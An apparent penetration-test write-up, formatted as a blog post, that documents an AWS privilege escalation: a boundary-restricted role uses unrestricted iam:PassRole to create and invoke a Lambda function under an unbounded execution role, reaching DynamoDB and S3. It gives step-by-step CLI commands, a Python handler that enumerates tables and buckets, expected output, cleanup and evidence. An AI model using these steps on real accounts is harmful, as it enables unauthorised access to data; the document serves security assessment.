---
layout: post
title: "PoC: Permissions Boundary Escape via Lambda PassRole"
date: 2026-04-15
categories: aws security poc iam
---

## Permissions Boundary Escape via Lambda PassRole

**Finding:** F1 + F2 · CRITICAL · CONFIRMED 5/5  
**Claim IDs:** `adhoc-20260415-boundary-passrole-unrestricted` → `adhoc-20260415-boundary-lambda-bypass`  
**Technique:** MITRE ATT&CK T1548 (Abuse Elevation Control Mechanism)  
**Risk:** Attacker operating within the `platform-restricted-admin-production` boundary escapes it entirely, gaining DynamoDB full CRUD and S3 read across the account

---

## Prerequisites

- **Current access:** `arn:aws:iam::123456789012:role/platform-restricted-admin-production` (EC2 instance profile or equivalent session)
- **Required permissions (all allowed by the boundary):**
  - `lambda:CreateFunction`
  - `lambda:InvokeFunction`
  - `iam:PassRole` (Resource: `*`)
- **Target execution role:** `arn:aws:iam::123456789012:role/svc-data-processor-exec-production` (trusts `lambda.amazonaws.com`, no boundary, has DynamoDB write + S3 read on `*`)
- **Region:** `ap-southeast-2` (or any enabled region — Lambda and IAM roles are region-scoped for execution but roles are global)

---

## Steps to Reproduce

### Step 1: Confirm current identity and boundary constraint

**Purpose:** Verify you are operating as the boundary-restricted role and confirm DynamoDB is blocked by the boundary

```bash
# Verify identity
aws sts get-caller-identity

# Confirm boundary blocks DynamoDB (expect AccessDenied)
aws dynamodb list-tables --region ap-southeast-2
```

**Expected output:**
```
# get-caller-identity shows platform-restricted-admin-production
{
    "UserId": "AROA...:i-...",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/platform-restricted-admin-production/i-..."
}

# list-tables returns AccessDenied — boundary does not include dynamodb:*
An error occurred (AccessDeniedException) when calling the ListTables operation: ...
```

---

### Step 2: Create the escalation payload

**Purpose:** Build a Lambda function that proves execution as the target role AND demonstrates access to DynamoDB (which the boundary blocks)

```bash
cat > /tmp/poc-boundary-bypass.py << 'PYEOF'
import boto3
import json

def handler(event, context):
    results = {}

    # Prove we are running as the target execution role (outside the boundary)
    sts = boto3.client("sts")
    results["identity"] = sts.get_caller_identity()

    # Prove DynamoDB access — this is blocked by the boundary but allowed
    # for the execution role, proving the boundary has been escaped
    dynamodb = boto3.client("dynamodb", region_name="ap-southeast-2")
    try:
        tables = dynamodb.list_tables()
        results["dynamodb_tables"] = tables["TableNames"]
        results["dynamodb_access"] = "SUCCESS — boundary bypassed"
    except Exception as e:
        results["dynamodb_access"] = f"FAILED: {str(e)}"

    # Prove S3 read access scope
    s3 = boto3.client("s3")
    try:
        buckets = s3.list_buckets()
        results["s3_buckets"] = [b["Name"] for b in buckets["Buckets"]]
        results["s3_access"] = "SUCCESS"
    except Exception as e:
        results["s3_access"] = f"FAILED: {str(e)}"

    return {"statusCode": 200, "body": json.dumps(results, default=str)}
PYEOF

cd /tmp && zip poc-boundary-bypass.zip poc-boundary-bypass.py
```

**Expected output:**
```
  adding: poc-boundary-bypass.py (deflated ...)
```

---

### Step 3: Create Lambda function with the unbounded execution role

**Purpose:** Use `iam:PassRole` (allowed by boundary on `*`) to pass `svc-data-processor-exec-production` to a new Lambda function. The Lambda will execute as that role — outside the boundary.

```bash
aws lambda create-function \
  --function-name poc-boundary-bypass-test \
  --runtime python3.12 \
  --handler poc-boundary-bypass.handler \
  --role arn:aws:iam::123456789012:role/svc-data-processor-exec-production \
  --zip-file fileb:///tmp/poc-boundary-bypass.zip \
  --timeout 30 \
  --region ap-southeast-2
```

**Expected output:**
```json
{
    "FunctionName": "poc-boundary-bypass-test",
    "FunctionArn": "arn:aws:lambda:ap-southeast-2:123456789012:function:poc-boundary-bypass-test",
    "Role": "arn:aws:iam::123456789012:role/svc-data-processor-exec-production",
    "Runtime": "python3.12",
    "Handler": "poc-boundary-bypass.handler"
}
```

---

### Step 4: Invoke Lambda to execute outside the boundary

**Purpose:** Trigger the function. It runs as `svc-data-processor-exec-production` — no boundary applies. This proves the boundary-restricted principal can access DynamoDB (and any other permission the execution role has) by delegating through Lambda.

```bash
aws lambda invoke \
  --function-name poc-boundary-bypass-test \
  --region ap-southeast-2 \
  /tmp/poc-bypass-output.json

cat /tmp/poc-bypass-output.json | python3 -m json.tool
```

**Expected output:**
```json
{
    "statusCode": 200,
    "body": {
        "identity": {
            "UserId": "AROA...:poc-boundary-bypass-test",
            "Account": "123456789012",
            "Arn": "arn:aws:sts::123456789012:assumed-role/svc-data-processor-exec-production/poc-boundary-bypass-test"
        },
        "dynamodb_tables": ["table1", "table2"],
        "dynamodb_access": "SUCCESS — boundary bypassed",
        "s3_buckets": ["bucket1", "bucket2"],
        "s3_access": "SUCCESS"
    }
}
```

**Key proof:** The `identity` shows `svc-data-processor-exec-production`, not `platform-restricted-admin-production`. The `dynamodb_access: SUCCESS` proves the boundary was escaped — the same `dynamodb:ListTables` call that returned `AccessDeniedException` in Step 1 now succeeds.

---

### Step 5: Verify escalation

**Purpose:** Confirm the boundary is the only thing that changed — same account, same origin, but different effective permissions

```bash
# From your original session (still boundary-restricted):
aws sts get-caller-identity
# Shows: platform-restricted-admin-production — boundary still applies here

# But the Lambda executed as svc-data-processor-exec-production with:
# - dynamodb:GetItem, PutItem, Query, Scan, UpdateItem, DeleteItem, BatchWriteItem on *
# - s3:GetObject, s3:ListBucket on *
# - logs:CreateLogGroup, CreateLogStream, PutLogEvents on *
# None of these DynamoDB actions are in the boundary's allow list.
```

---

## Cleanup

**Run these commands to reverse all changes made during testing:**

```bash
# Delete the PoC Lambda function
aws lambda delete-function \
  --function-name poc-boundary-bypass-test \
  --region ap-southeast-2

# Remove local temp files
rm -f /tmp/poc-boundary-bypass.py \
      /tmp/poc-boundary-bypass.zip \
      /tmp/poc-bypass-output.json
```

**Verify cleanup:**
```bash
# Confirm function is deleted (expect ResourceNotFoundException)
aws lambda get-function \
  --function-name poc-boundary-bypass-test \
  --region ap-southeast-2

# Expected: An error occurred (ResourceNotFoundException)
```

---

## Evidence Chain

| Step | Source | Evidence |
|:-----|:-------|:---------|
| Boundary policy | `adhoc-20260415-boundary-passrole-unrestricted` | `iam:PassRole` with `Resource: "*"` confirmed in `platform-admin-boundary-production` v1 |
| Lambda allowed | `adhoc-20260415-boundary-lambda-bypass` | `lambda:*` confirmed in boundary `AllowComputeAndStorage` statement |
| Target role trust | CLI: `get-role` | `svc-data-processor-exec-production` trusts `lambda.amazonaws.com`, no PermissionsBoundary |
| Target role perms | CLI: `get-policy-version` | `svc-data-processor-policy-production` grants DynamoDB full CRUD on `*`, S3 read on `*` |
| Boundary excludes DynamoDB | CLI: `get-policy-version` | Boundary only allows ec2/s3/logs/cloudwatch/lambda + 5 IAM read/pass actions — no `dynamodb:*` |
| Attack path | Chain analysis | F1 (unrestricted PassRole) → F2 (Lambda bypass) = IMMEDIATELY EXPLOITABLE |
